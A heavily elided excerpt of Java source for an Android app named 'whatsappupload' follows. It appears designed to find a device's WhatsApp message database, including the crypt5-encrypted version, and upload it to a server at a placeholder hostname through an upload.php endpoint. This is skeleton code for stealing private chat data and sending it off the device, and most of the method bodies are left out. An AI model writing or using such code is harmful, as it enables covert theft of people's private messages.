package just4fun.security.whatsappupload;
...
public class MainActivity extends Activity {
	...
	private void uploadFile(String file) {
		...
		int maxBufferSize = 1 * 1024 * 1024 * 1024;
                ...
                // TODO change hosntame
		String urlString = "http://hostname/whatsapp/upload.php?n=" + name;
		try {
			// 	------------------ CLIENT REQUEST
	...
	private class UploadWhatsApp extends AsyncTask<Void, Integer, Void>{
		...
		{
                        // newer whatsapp using crypt5 to encrypt db.. so now we
                        // need to check if the file exists, then upload that
                        // one. TODO
